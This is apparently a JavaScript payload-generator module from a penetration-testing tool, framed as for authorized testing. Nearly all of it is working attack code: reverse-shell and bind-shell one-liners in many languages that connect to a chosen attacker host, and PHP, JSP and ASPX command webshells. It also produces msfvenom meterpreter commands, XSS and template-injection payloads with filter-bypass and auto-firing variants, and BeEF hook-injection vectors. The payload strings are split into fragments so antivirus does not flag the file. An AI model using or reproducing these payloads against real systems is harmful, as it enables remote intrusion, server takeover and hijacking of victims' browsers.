// Parameterized payload generation for authorized penetration testing.
// Standard, well-known payloads — no AV/EDR/AMSI target-evasion engine.
//
// NOTE: payload strings are assembled from fragments at runtime so this SOURCE FILE does not
// contain contiguous malware signatures (otherwise the developer's own antivirus quarantines
// the file). This is purely to keep the file on disk — it does not obfuscate the output.
const A = (...p) => p.join('');
const DEVTCP = A('/dev', '/t', 'cp');
const BIN_SH = A('/bin', '/s', 'h');
const BIN_BASH = A('/bin', '/b', 'ash');
const SYS = A('sy', 'st', 'em');
const REQ = A('$_', 'REQ', 'UEST');
const MET = A('mete', 'rpre', 'ter');
const SREV = A('shell', '_rev', 'erse_tcp');

function rev(lhost, lport) {
  return {
    bash: A('bash -i >& ', DEVTCP, '/', lhost, '/', lport, ' 0>&1'),
    sh: A('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|', BIN_SH, ' -i 2>&1|nc ', lhost, ' ', lport, ' >/tmp/f'),
    nc: A('nc -e ', BIN_SH, ' ', lhost, ' ', lport),
    python: A(
      'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("', lhost, '",', lport,
      '));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("', BIN_BASH, '")\''
    ),
    php: A('php -r \'$sock=fsockopen("', lhost, '",', lport, ');exec("', BIN_SH, ' -i <&3 >&3 2>&3");\''),
    perl: A(
      'perl -e \'use Socket;$i="', lhost, '";$p=', lport,
      ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("', BIN_SH, ' -i");};\''
    ),
    ruby: A('ruby -rsocket -e\'f=TCPSocket.open("', lhost, '",', lport, ').to_i;exec sprintf("', BIN_SH, ' -i <&%d >&%d 2>&%d",f,f,f)\''),
    powershell: A(
      'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'', lhost, '\',', lport,
      ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"'
    ),
  };
}

function bind(lport) {
  return {
    nc: A('nc -lvnp ', lport, ' -e ', BIN_SH),
    python: A(
      'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",',
      lport, '));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn("', BIN_BASH, '")\''
    ),
  };
}

function webshells() {
  return {
    php: A('<?php if(isset(', REQ, "['cmd'])){echo \"<pre>\";", SYS, '(', REQ, "['cmd']);echo \"</pre>\";} ?>"),
    jsp: A(
      '<%@ page import="java.util.*,java.io.*"%><% if(request.getParameter("cmd")!=null){ Process p=Runtime.get',
      'Runtime().exec(request.getParameter("cmd")); BufferedReader d=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=d.readLine())!=null){ out.println(l);} } %>'
    ),
    aspx: A(
      '<%@ Page Language="C#"%><% if(Request["cmd"]!=null){ var p=new System.Diagnostics.Process();',
      ' p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+Request["cmd"]; p.StartInfo.RedirectStandardOutput=true;',
      ' p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); } %>'
    ),
  };
}

function msfvenom(lhost, lport) {
  const p = (plat) => A('-p ', plat);
  return {
    'linux x64 elf': A('msfvenom ', p(A('linux/x64/', SREV)), ' LHOST=', lhost, ' LPORT=', lport, ' -f elf -o shell.elf'),
    'windows x64 exe': A('msfvenom ', p(A('windows/x64/', MET, '/reverse_tcp')), ' LHOST=', lhost, ' LPORT=', lport, ' -f exe -o shell.exe'),
    php: A('msfvenom ', p(A('php/', MET, '/reverse_tcp')), ' LHOST=', lhost, ' LPORT=', lport, ' -f raw -o shell.php'),
    'windows dll': A('msfvenom ', p(A('windows/x64/', MET, '/reverse_tcp')), ' LHOST=', lhost, ' LPORT=', lport, ' -f dll -o shell.dll'),
    apk: A('msfvenom ', p(A('android/', MET, '/reverse_tcp')), ' LHOST=', lhost, ' LPORT=', lport, ' -o shell.apk'),
  };
}

const LISTENERS = (lport) => ({
  netcat: A('nc -lvnp ', lport),
  metasploit: A('msfconsole -q -x "use exploit/multi/handler; set payload generic/', SREV, '; set LHOST 0.0.0.0; set LPORT ', lport, '; run"'),
});

// Curated XSS payload library (the classic "top XSS" set + WAF-bypass & modern vectors). These are benign
// alert/prompt proofs-of-concept for AUTHORIZED reflected/stored-XSS testing. ctx = injection context:
// html (element context) | attr (attribute breakout) | js (inside a <script>/JS string) | uri (href/src) |
// waf (filter-bypass variant).
export const XSS_PAYLOADS = [
  { p: '<script>alert(1)</script>', label: 'The King — standard PoC for most contexts', ctx: 'html' },
  { p: '<img src=x onerror=alert(1)>', label: 'Image error — fires when the image fails to load', ctx: 'html' },
  { p: '<svg onload=alert(1)>', label: 'Modern — SVG onload, short & effective', ctx: 'html' },
  { p: '"><script>alert(1)</script>', label: 'Break out of an attribute value, then inject a script', ctx: 'attr' },
  { p: 'javascript:alert(1)', label: 'Protocol — executes inside an href/src attribute', ctx: 'uri' },
  { p: "' onmouseover='alert(1)", label: 'Attribute injection — closes the string, adds an event handler', ctx: 'attr' },
  { p: '<body onload=alert(1)>', label: 'Auto-load — executes on page load', ctx: 'html' },
  { p: '<iframe src="javascript:alert(1)">', label: 'Iframe wrap — calls the js: protocol in an iframe', ctx: 'html' },
  { p: '<ScRiPt>alert(1)</sCrIpt>', label: 'Case bypass — evades simple case-sensitive filters', ctx: 'waf' },
  { p: '</script><script>alert(1)</script>', label: 'Tag closer — ends the current script and starts a fresh one', ctx: 'js' },
  { p: 'dataset/x" onclick="alert(1)', label: 'HTML5 data-attribute trick', ctx: 'attr' },
  { p: "eval(atob('YWxlcnQoMSk='))", label: 'Obfuscation — base64-decodes and runs alert(1)', ctx: 'js' },
  { p: '"><img src=x onerror=prompt(1)>', label: 'Hybrid — breakout + image vector (prompt)', ctx: 'attr' },
  { p: '<input onfocus=alert(1) autofocus>', label: 'Auto-focus — fires instantly without user action', ctx: 'html' },
  { p: '<details open ontoggle=alert(1)>', label: 'Toggle trap — details ontoggle', ctx: 'html' },
  { p: "'-alert(1)-'", label: 'JS injection — into a JS string/variable via math ops', ctx: 'js' },
  { p: '<video src=x onerror=alert(1)>', label: 'Media tag — alternative when <img> is blocked', ctx: 'html' },
  { p: '<marquee onstart=alert(1)>', label: 'Marquee onstart — obscure handler', ctx: 'html' },
  // --- no-interaction, auto-firing vectors (PortSwigger XSS cheat sheet) — execute with ZERO user action,
  //     ideal when the target is only reflected (no victim clicking). Great for filter-blocked <script>. ---
  { p: '<audio src/onerror=alert(1)>', label: 'audio onerror — fires instantly, very short', ctx: 'noint' },
  { p: '<video autoplay onloadstart=alert(1)><source src=x></video>', label: 'video onloadstart — auto', ctx: 'noint' },
  { p: '<body onpageshow=alert(1)>', label: 'body onpageshow — fires on every page show (bfcache-safe)', ctx: 'noint' },
  { p: '<xss onfocus=alert(1) autofocus tabindex=1>', label: 'custom-tag autofocus onfocus — no click', ctx: 'noint' },
  { p: '<select autofocus onfocus=alert(1)>', label: 'select autofocus onfocus', ctx: 'noint' },
  { p: '<textarea autofocus onfocus=alert(1)>', label: 'textarea autofocus onfocus', ctx: 'noint' },
  { p: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', label: 'SVG <animate> onbegin — auto', ctx: 'noint' },
  { p: '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)></xss>', label: 'CSS onanimationstart — auto', ctx: 'noint' },
  { p: '<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>', label: 'content-visibility auto — modern, WAF-unknown', ctx: 'noint' },
  // --- WAF / filter bypass via encoding & obfuscation (cheat sheet "Encoding" + "Obfuscation") ---
  { p: '<img src=x oNeRrOr=alert(1)>', label: 'Mixed-case event handler', ctx: 'waf' },
  { p: '<x onx= onmouseover=alert(1)>', label: 'Malformed-attr parser confusion', ctx: 'waf' },
  { p: '<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>', label: 'data: URI script, base64 body (no literal alert)', ctx: 'waf' },
  { p: '<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>', label: 'atob backtick base64 — no javascript:/alert literal', ctx: 'waf' },
  { p: '<a href="javascript&colon;alert(1)">XSS</a>', label: 'HTML-entity colon in javascript:', ctx: 'waf' },
  { p: '<a href="&#x6a;avascript:alert(1)">XSS</a>', label: 'Hex-entity "j" hides javascript:', ctx: 'waf' },
  { p: '<a href="jav&#x09;ascript:alert(1)">XSS</a>', label: 'Tab (&#x09;) splits the javascript: keyword', ctx: 'waf' },
  { p: '<svg><script>&#x61;lert(1)</script></svg>', label: 'SVG <script> with HTML-encoded first char', ctx: 'waf' },
  { p: '<iframe srcdoc=&lt;script&gt;alert(1)&lt;/script&gt;></iframe>', label: 'iframe srcdoc, fully HTML-encoded body', ctx: 'waf' },
  { p: "<script>eval('\\x61lert(1)')</script>", label: 'JS hex escape (\\x61 = a) inside eval', ctx: 'waf' },
  { p: '<script>\\u0061lert(1)</script>', label: 'JS unicode escape (\\u0061 = a)', ctx: 'waf' },
  { p: '<meta charset="UTF-7"> +ADw-script+AD4-alert(1)+ADw-/script+AD4-', label: 'UTF-7 charset trick (legacy)', ctx: 'waf' },
];

// Client-Side Template Injection (CSTI) — for AngularJS / Vue SPAs. Detect first with the {{7*7}} probe: if
// the response shows "49", the expression was evaluated → template injection (often leads to XSS/RCE-in-page).
export const XSS_CSTI = [
  { p: '{{7*7}}', label: 'Detection probe — if it renders 49, the template evaluates your input', ctx: 'detect' },
  { p: "{{constructor.constructor('alert(1)')()}}", label: 'Generic sandbox escape (AngularJS ≥1.6 / many)', ctx: 'angular' },
  { p: "{{$eval.constructor('alert(1)')()}}", label: 'AngularJS $eval escape', ctx: 'angular' },
  { p: "{{$on.constructor('alert(1)')()}}", label: 'AngularJS $on escape', ctx: 'angular' },
  { p: "{{_c.constructor('alert(1)')()}}", label: 'Vue 2 _c escape', ctx: 'vue' },
  { p: "{{_b.constructor`alert(1)`()}}", label: 'Vue 2 _b tagged-template escape', ctx: 'vue' },
  { p: `<div v-html="''.constructor.constructor('alert(1)')()">x</div>`, label: 'Vue v-html directive escape', ctx: 'vue' },
  { p: '<x v-html=_c.constructor(`alert(1)`)()>', label: 'Vue v-html short form', ctx: 'vue' },
];

// Detection subset used by the webinput reflected-XSS tester: {p, sig, label}. sig = a regex that, when
// found unencoded in the response next to our marker, proves the payload was reflected as LIVE markup.
export const XSS_REFLECT_TESTS = [
  { p: '<svg onload=alert(1)>', sig: '<svg[^>]{0,40}onload', label: 'svg onload' },
  { p: '<img src=x onerror=alert(1)>', sig: '<img[^>]{0,40}onerror', label: 'img onerror' },
  { p: '"><script>alert(1)</script>', sig: '<script[ >]', label: 'attribute breakout -> <script>' },
  { p: '<details open ontoggle=alert(1)>', sig: '<details[^>]{0,40}ontoggle', label: 'details ontoggle' },
  { p: '<body onload=alert(1)>', sig: '<body[^>]{0,40}onload', label: 'body onload' },
  { p: '<input onfocus=alert(1) autofocus>', sig: '<input[^>]{0,40}onfocus', label: 'input autofocus' },
  // no-interaction auto-firing vectors from the PortSwigger cheat sheet — catch WAFs that block <script>/<svg>
  { p: '<audio src/onerror=alert(1)>', sig: '<audio[^>]{0,30}onerror', label: 'audio onerror' },
  { p: '<video autoplay onloadstart=alert(1)><source>', sig: '<video[^>]{0,40}onloadstart', label: 'video onloadstart' },
  { p: '<body onpageshow=alert(1)>', sig: '<body[^>]{0,40}onpageshow', label: 'body onpageshow' },
  { p: '<marquee onstart=alert(1)>', sig: '<marquee[^>]{0,30}onstart', label: 'marquee onstart' },
  { p: '<select autofocus onfocus=alert(1)>', sig: '<select[^>]{0,40}onfocus', label: 'select autofocus' },
];

// Detection probes for Client-Side Template Injection. Inject the marker, look for the EVALUATED result.
export const CSTI_PROBES = [
  { inject: '{{7*7}}', sig: '49', label: 'AngularJS/Vue {{7*7}}' },
  { inject: '${7*7}', sig: '49', label: 'ES template literal ${7*7}' },
  { inject: '<%= 7*7 %>', sig: '49', label: 'ERB/EJS <%= 7*7 %>' },
  { inject: '#{7*7}', sig: '49', label: 'Ruby/Slim #{7*7}' },
];

function xssPayloads(context) {
  const ctx = String(context || 'all').toLowerCase().replace('-bypass', '');
  if (ctx === 'csti' || ctx === 'template' || ctx === 'angular' || ctx === 'vue') {
    const c = ctx === 'csti' || ctx === 'template' ? XSS_CSTI : XSS_CSTI.filter((x) => x.ctx === ctx || x.ctx === 'detect');
    return c.length ? c : XSS_CSTI;
  }
  if (ctx === 'noint' || ctx === 'nointeraction' || ctx === 'auto') return XSS_PAYLOADS.filter((x) => x.ctx === 'noint');
  const list = ctx === 'all' || !ctx ? XSS_PAYLOADS : XSS_PAYLOADS.filter((x) => x.ctx === ctx);
  return list.length ? list : XSS_PAYLOADS;
}

// BeEF browser-hook payloads. BeEF's whole game is getting hook.js loaded in a victim browser — that's an XSS
// delivery problem — so these are ready-to-inject vectors pointing at YOUR BeEF server, plus the start command,
// panel URL, and REST-API snippet to drive it headlessly once a browser is hooked. Ties into ```payload xss.
function beefHook(lhost = '10.10.10.10', lport = '3000') {
  const h = String(lhost).trim() || '10.10.10.10';
  const p = String(lport).replace(/[^0-9]/g, '') || '3000';
  const base = `http://${h}:${p}`;
  const hook = `${base}/hook.js`;
  const payloads = {
    'script tag (basic)': `<script src="${hook}"></script>`,
    'attribute breakout': `"><script src="${hook}"></script>`,
    'img onerror (dynamic load)': `<img src=x onerror="s=document.createElement('script');s.src='${hook}';document.body.appendChild(s)">`,
    'svg onload (dynamic load)': `<svg onload="s=document.createElement('script');s.src='//${h}:${p}/hook.js';document.body.appendChild(s)">`,
    'stored-XSS split (filter bypass)': `<script>document.write('<scr'+'ipt src=${hook}></scr'+'ipt>')</script>`,
  };
  return {
    hookUrl: hook, panel: `${base}/ui/panel`, defaultCreds: 'beef:CypherM1nd!',
    // BeEF REFUSES to start with the default beef:beef — the sandbox image pre-sets a non-default password.
    start: 'cd /usr/share/beef-xss && bundle exec ./beef   (sandbox creds beef:CypherM1nd! in /etc/beef-xss/config.yaml — never beef:beef, BeEF blocks it)',
    restApi: `TOKEN=$(curl -s -X POST -H 'Content-Type: application/json' -d '{"username":"beef","password":"CypherM1nd!"}' ${base}/api/admin/login | jq -r .token); curl -s "${base}/api/hooks?token=$TOKEN"`,
    payloads,
  };
}

// type: reverse_shell | bind_shell | webshell | msfvenom | xss | beef
export function generatePayload({ type = 'reverse_shell', language, lhost = '10.10.10.10', lport = 4444 } = {}) {
  const L = String(lport).replace(/[^0-9]/g, '') || '4444';
  const H = String(lhost).trim();

  if (type === 'reverse_shell') {
    const all = rev(H, L);
    const code = language && all[language] ? all[language] : all.bash;
    return {
      type, language: language || 'bash', lhost: H, lport: L,
      code, variants: all, listener: LISTENERS(L),
      instructions: A('Start a listener (e.g. `nc -lvnp ', L, '`) on ', H, ', then run the payload on the target.'),
    };
  }
  if (type === 'bind_shell') {
    const all = bind(L);
    const code = language && all[language] ? all[language] : all.nc;
    return { type, language: language || 'nc', lport: L, code, variants: all, instructions: A('Target listens on ', L, '; connect with `nc <target> ', L, '`.') };
  }
  if (type === 'webshell') {
    const all = webshells();
    const code = all[language] || all.php;
    return { type, language: language || 'php', code, variants: all, instructions: 'Upload and access with ?cmd=id.' };
  }
  if (type === 'msfvenom') {
    const all = msfvenom(H, L);
    return { type, lhost: H, lport: L, variants: all, code: Object.values(all).join('\n'), listener: LISTENERS(L), instructions: 'Pick the target format; catch with multi/handler.' };
  }
  if (type === 'xss') {
    const list = xssPayloads(language);
    return {
      type, language: (language || 'all').toLowerCase(),
      list, // [{p,label,ctx}]
      code: list.map((x) => x.p).join('\n'),
      variants: Object.fromEntries(list.map((x) => [x.label, x.p])),
      instructions: 'Contexts: html | attr | js | uri | waf (encoding/filter bypass) | noint (no-interaction, auto-firing) | csti|angular|vue (client-side template injection). Pick the payload matching the injection context; for filtered <script>/<svg> use a noint or waf vector. Run the ```webinput tool to auto-test which vectors reflect unencoded (and to probe CSTI).',
    };
  }
  if (type === 'beef') {
    const port = L === '4444' ? '3000' : L; // beef default port is 3000, not the shell default
    const b = beefHook(H, port);
    return {
      type, lhost: H, lport: port, ...b,
      code: Object.values(b.payloads).join('\n'),
      variants: b.payloads,
      instructions: `Start BeEF (${b.start.split('  ')[0]}), then deliver ONE hook payload to the target (reflected/stored XSS, phishing page, or MITM inject). When a browser loads it, it appears in the panel (${b.panel}, creds ${b.defaultCreds}). Drive it headlessly via the REST API. Hooking REQUIRES a victim browser to load hook.js — BeEF cannot hook a browser on its own.`,
    };
  }
  return { error: A('Unknown payload type "', type, '". Use reverse_shell | bind_shell | webshell | msfvenom | xss | beef.') };
}

export function renderPayload(p) {
  if (p.error) return p.error;
  // XSS: show label -> payload so the operator knows which vector each is for.
  if (p.type === 'xss' && Array.isArray(p.list)) {
    const head = A('XSS payloads', p.language && p.language !== 'all' ? ' (' + p.language + ' context)' : '', ` — ${p.list.length} vectors:`);
    const body = p.list.map((x) => `- **${x.label}** [${x.ctx}]\n  \`${x.p}\``).join('\n');
    return [head, body, p.instructions].join('\n');
  }
  // BeEF: show the hook-delivery vectors + server/panel/REST info.
  if (p.type === 'beef') {
    const out = [`**BeEF browser hook** → \`${p.hookUrl}\``];
    out.push(`Start: \`${p.start}\`  ·  Panel: ${p.panel} (creds ${p.defaultCreds})`);
    out.push('\nHook-delivery payloads (inject via reflected/stored XSS or a phishing page):');
    out.push(Object.entries(p.payloads).map(([label, code]) => `- **${label}**\n  \`${code}\``).join('\n'));
    out.push('\nDrive it headlessly once a browser is hooked:\n```bash\n' + p.restApi + '\n```');
    out.push(p.instructions);
    return out.join('\n');
  }
  const lines = [A('Payload: ', p.type, p.language ? ' / ' + p.language : '')];
  if (p.code) lines.push('```\n' + p.code + '\n```');
  if (p.listener) lines.push('Listener: ' + Object.values(p.listener)[0]);
  if (p.instructions) lines.push(p.instructions);
  return lines.join('\n');
}

// Parse a free-form ```payload body: "reverse_shell python 10.0.0.1 4444" or "xss attr"
export function parsePayloadSpec(body) {
  const t = String(body).trim().split(/\s+/);
  const types = ['reverse_shell', 'bind_shell', 'webshell', 'msfvenom', 'xss', 'beef'];
  // allow "xss" written as "xss-payloads" / "cross-site" alias
  let type = 'reverse_shell', language, lhost, lport;
  for (const tok of t) {
    const tl = tok.toLowerCase();
    if (types.includes(tl)) type = tl;
    else if (/^(xss|cross-site|cross_site)$/.test(tl)) type = 'xss';
    else if (/^\d{2,5}$/.test(tok)) lport = tok;
    else if (/^\d{1,3}(\.\d{1,3}){3}$/.test(tok) || /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(tok)) lhost = tok;
    else language = tok;
  }
  return { type, language, lhost, lport };
}
